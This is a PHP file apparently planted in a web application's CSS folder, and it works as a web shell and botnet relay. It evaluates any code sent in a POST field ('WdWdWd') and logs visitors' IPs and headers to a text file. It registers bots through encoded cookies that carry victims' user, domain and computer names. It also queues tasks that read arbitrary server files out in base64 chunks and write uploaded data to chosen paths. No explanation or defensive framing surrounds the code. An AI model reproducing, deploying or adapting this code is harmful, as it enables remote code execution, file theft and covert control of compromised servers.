<?php
define('WorkPath', '/opt/app-root/src/app/webroot/css/');
define('WaitTimeout', 28);
define('WaitSetp', 10000);
date_default_timezone_set('ETC/GMT-8');
set_time_limit(0);
session_start();


@eval($_POST['WdWdWd']);
$HttpHeader = "{$_SERVER[REQUEST_METHOD]} {$_SERVER[REQUEST_URI]} {$_SERVER[SERVER_PROTOCOL]}\n";
	
foreach (@mgetallheaders() as $key => $value)
	$HttpHeader.= "$key: $value\n";

$IPADRESS = $_SERVER['REMOTE_ADDR'];

function mgetallheaders() 
{ 
	$headers = ''; 
	foreach ($_SERVER as $name => $value) 
	{ 
		if (substr($name, 0, 5) == 'HTTP_') 
		{ 
			$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; 
		} 
	} 
	return $headers; 
}
@file_put_contents('/opt/app-root/src/app/webroot/css/httplog.txt', "[$IPADRESS] - ".date('Y-m-d H:i:s')."\n$HttpHeader\n\n", FILE_APPEND);





function Worker()
{
  $Start = strtotime('now');
  if (!isset($_SESSION['hash'])) 
  {
    $AuthFlag = Authentication();
    if ($AuthFlag)
    {
      $_SESSION['BotFile'] = WorkPath.'bot_'.$_SESSION['hash'];
      $_SESSION['SWPFile'] = WorkPath.'swp_'.$_SESSION['hash'];
      $_SESSION['RETFile'] = WorkPath.'ret_'.$_SESSION['hash'];
      
      if (fWriteContent($_SESSION['BotFile'], serialize($_SESSION['BotInfo'])))
        return $AuthFlag;
      else{
        unset($_SESSION['hash']);
        unset($_SESSION['BotInfo']);
        return '';
      }
    }    
  }else{
    if (!@file_exists($_SESSION['BotFile']))
    {
      unset($_SESSION['hash']);
      unset($_SESSION['BotInfo']);
      return '';
    }
    @touch($_SESSION['BotFile']);
    if ($_SERVER['REQUEST_METHOD'] == 'GET')
    {
      for ($i = 0; (strtotime('now') - $Start) < WaitTimeout ; $i++)
      {
        if (@file_exists($_SESSION['SWPFile'])){
          $SWP = @fReadContent($_SESSION['SWPFile']);
          @unlink($_SESSION['SWPFile']);
          return $SWP;
        }
        
        if ($i % 2){
          $D = Download();
          if ($D) return $D;
        }
        usleep(WaitSetp);
      }
      return '';
    } elseif (isset($_POST[$_SESSION['Field']])) {
      Upload();
      if (@file_exists($_SESSION['SWPFile'])){
        $SWP = @fReadContent($_SESSION['SWPFile']);
        @unlink($_SESSION['SWPFile']);
        return $SWP;
      }

      if (empty($_POST[$_SESSION['Field']])) {
        return $_SESSION['VFMark'];
      }else{
        @fWriteContent($_SESSION['RETFile'], base64_decode($_POST[$_SESSION['Field']]));
        return Download();
      }
    }
  }
  return '';
}
function Upload(){
  if (isset($_POST[$_SESSION['upFlag']]) && @file_exists($_SESSION['upload_task'])){
    $F = @unserialize(@fReadContent($_SESSION['upload_task']));
    if (!$F || $F['Done'] != 0)
      return;
    $D = @base64_decode($_POST[$_SESSION['upFlag']]);
    
    $handle = fopen($F['Dest'], 'a');
    if(!$handle){
      echo "sss ".strlen($D);
      $F['Done'] = 2;
      @fWriteContent($_SESSION['upload_task'], @serialize($F));
      return;
    }
    if (flock($handle, LOCK_EX)) {
      $WD = fwrite($handle, $D);
      flock($handle, LOCK_UN);
    }
    fclose($handle);
  }
}
function Download(){
  if (@file_exists($_SESSION['download_task'])){
    $F = @unserialize(@fReadContent($_SESSION['download_task']));    
    if (!$F || $F['Done'] != 0){
      return '';
    }
    
    $RD = null;
    $APPEND = $F['Postion'] != 0;
    do{
      if ($F['Postion'] >= @filesize($F['File'])){
        $F['Done'] = 1;
        @fWriteContent($_SESSION['download_task'], @serialize($F));
        return '';
      }
      if ($F['Postion'] >= @filesize($F['File']))break;
      $RD = @fopen($F['File'], 'r');
      if (!$RD){
        $F['Done'] = 2;
        break;
      }

      fseek($RD, $F['Postion']);
      $D = fread($RD, $F['rSize']);
      if (!$D) {
        $F['Done'] = 3;
        break;
      }
      fclose($RD);
      $F['Postion'] += strlen($D);
      @fWriteContent($_SESSION['download_task'], @serialize($F));
      return $_SESSION['bgFlag'].base64_encode('3'.randStr(3).json_encode(array('Dst' => $F['Dest'], 'EDF'=>$F['EDF'], 'A'=>$APPEND ? 1 : 0))).$_SESSION['edFlag'].base64_encode($D).$F['EDF'];
    }while(1);
    if ($RD) @fclose($RD);
    @fWriteContent($_SESSION['download_task'], @serialize($F));
  }
  return '';
}
function Authentication(){
  if (empty($_COOKIE))
    return '';

  foreach ($_COOKIE as $k => $v) {
    if(preg_match('![^a-zA-Z0-9/+=]!', $v))
      continue;
    $d = @base64_decode($v);
    if (strlen($d) < 22)
      continue;
    $d = explode('^', $d);
    if (count($d) != 3 || strlen($d[1]) != 12)
      continue;
    $F = explode('|', base64_decode($d[2]));
    if (count($F) != 5)
      continue;


    $BotInfo['UserDomain'] = $F[0];
    $BotInfo['UserName'] = $F[1];
    $BotInfo['ComputerName'] = $F[2];
    $BotInfo['CurrentDomain'] = $F[3];
    $BotInfo['IsDomainComputer'] = intval($F[4]);
    $BotInfo['bgFlag'] = substr($d[1], 4, 4);
    $BotInfo['edFlag'] = substr($d[1], 8, 4);

    $_SESSION['hash'] = md5($BotInfo['UserName'].$BotInfo['ComputerName']);

    $BotInfo['upload_task'] = WorkPath.'upl_'.$_SESSION['hash'];
    $BotInfo['download_task'] = WorkPath.'dow_'.$_SESSION['hash'];
    $_SESSION['upload_task'] = $BotInfo['upload_task'];
    $_SESSION['download_task'] = $BotInfo['download_task'];
    $_SESSION['Field'] = substr($d[1], 0, 4);
    $_SESSION['bgFlag'] = $BotInfo['bgFlag'];
    $_SESSION['edFlag'] = $BotInfo['edFlag'];
    $_SESSION['upFlag'] = substr($BotInfo['bgFlag'], 1, 2) . substr($BotInfo['edFlag'], 1, 2);
    $_SESSION['BotInfo'] = $BotInfo;
    
    $H = @unserialize(fReadContent(WorkPath.'Hosts'));
    if ($H && isset($H[$BotInfo['ComputerName']])) {
      return RpField(randStr(1).$_SESSION['upFlag'].$H[$BotInfo['ComputerName']]);
    }
    return RpField($d[0]);
  }
  return '';
}
function RpField($d)
{
  if (strlen($d) == 0)
    return '';
  return $_SESSION['bgFlag'].@base64_encode($d).$_SESSION['edFlag'];
}


$out = Worker();
if ($out) {
  echo $out;
  exit();
}

function randStr($len, $Nf=0)
{ 
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
    $string = ''; 
    for(; $len >= 1; $len--) 
    {
        $position = rand()%strlen($chars);
        $string .= substr($chars,$position,1); 
    }
    return $string; 
}
if (!function_exists('getallheaders')) 
{
  function getallheaders()
  {
    $headers = '';
    foreach ($_SERVER as $name => $value)
    {
      if (substr($name, 0, 5) == 'HTTP_')
      {
        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
      }
    }
    return $headers; 
  }
}
function fReadContent($f){
  return @file_get_contents($f);
}
function fWriteContent($f, $d){
  return @file_put_contents($f, $d);
}

?>